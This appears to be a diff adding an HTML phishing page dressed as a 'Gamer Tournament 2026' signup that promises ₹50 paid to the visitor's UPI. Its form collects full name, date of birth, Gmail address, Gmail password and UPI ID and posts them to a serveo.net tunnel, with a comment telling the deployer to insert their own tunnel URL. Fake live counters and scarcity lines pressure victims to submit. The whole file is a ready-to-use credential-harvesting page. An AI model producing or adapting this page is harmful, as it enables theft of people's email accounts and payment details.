@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 Gamer Tournament 2026 - Win ₹50!</title>
+    
+    <!-- Three.js + Vanta.js for 3D Background -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+        
+        /* 3D Background */
+        #vanta-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+        }
+        
+        /* Dark overlay so text is readable */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.3);
+            z-index: 0;
+        }
+        
+        /* Main Card */
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(10, 10, 25, 0.88);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(0, 255, 255, 0.25);
+            border-radius: 24px;
+            padding: 35px 30px;
+            max-width: 420px;
+            width: 92%;
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.1);
+        }
+        
+        /* Tournament Badge */
+        .badge {
+            background: linear-gradient(135deg, #ff4444, #ff8800);
+            padding: 8px 16px;
+            border-radius: 50px;
+            display: inline-block;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .title {
+            color: white;
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 5px;
+        }
+        
+        .title span {
+            background: linear-gradient(135deg, #00fff2, #0088ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .prize-box {
+            background: linear-gradient(135deg, rgba(255,215,0,0.15), rgba(255,165,0,0.1));
+            border: 1px solid rgba(255,215,0,0.4);
+            border-radius: 12px;
+            padding: 12px 15px;
+            text-align: center;
+            margin-bottom: 22px;
+        }
+        
+        .prize-box .rupee {
+            font-size: 32px;
+            font-weight: 900;
+            color: #ffd700;
+        }
+        
+        .prize-box .label {
+            color: #ccc;
+            font-size: 13px;
+        }
+        
+        /* Form */
+        form { width: 100%; }
+        
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #bbb;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #00fff2;
+            box-shadow: 0 0 15px rgba(0,255,242,0.1);
+        }
+        
+        .form-group input::placeholder {
+            color: #666;
+        }
+        
+        .register-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00fff2, #0088ff);
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .register-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,255,242,0.3);
+        }
+        
+        .footer-text {
+            color: #555;
+            font-size: 11px;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        /* Live counter animation */
+        .live-counter {
+            text-align: center;
+            margin-bottom: 15px;
+            color: #00ff88;
+            font-size: 13px;
+            font-weight: 600;
+            animation: blink 1.5s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 3D Background Container -->
+    <div id="vanta-bg"></div>
+    <div class="overlay"></div>
+
+    <!-- Main Card -->
+    <div class="card">
+        <div class="badge">🔥 LIVE NOW</div>
+        <div class="title">🎮 <span>GAMER TOURNAMENT</span></div>
+        <div class="subtitle">Register & win instant ₹50 on your UPI!</div>
+        
+        <div class="live-counter">⚡ 127 players registered • 23 spots left</div>
+        
+        <div class="prize-box">
+            <div class="rupee">₹50</div>
+            <div class="label">INSTANT WINNING — Paid directly to your UPI! 🎉</div>
+        </div>
+        
+        <!-- IMPORTANT: Replace YOUR_SERVEO_URL with your actual serveo URL -->
+        <form action="https://YOUR_SERVEO_URL.serveo.net" method="POST">
+            <div class="form-group">
+                <label>Your Full Name</label>
+                <input type="text" name="name" placeholder="Enter your name" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Date of Birth</label>
+                <input type="date" name="dob" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Gmail Address</label>
+                <input type="email" name="email" placeholder="your@gmail.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Gmail Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            
+            <div class="form-group">
+                <label>UPI ID (for ₹50 payment)</label>
+                <input type="text" name="upi" placeholder="example@upi" required>
+            </div>
+            
+            <button type="submit" class="register-btn">🚀 Register & Win ₹50</button>
+        </form>
+        
+        <p class="footer-text">✅ Only 50 participants will win. Hurry up!</p>
+    </div>
+
+    <!-- Initialize 3D Background -->
+    <script>
+        VANTA.NET({
+            el: "#vanta-bg",
+            mouseControls: true,
+            touchControls: true,
+            gyroControls: false,
+            minHeight: 200.00,
+            minWidth: 200.00,
+            scale: 1.00,
+            scaleMobile: 1.00,
+            color: 0x00fff2,
+            backgroundColor: 0x0a0a19,
+            points: 15.00,
+            maxDistance: 22.00,
+            spacing: 17.00
+        });
+    </script>
+</body>
+</html>
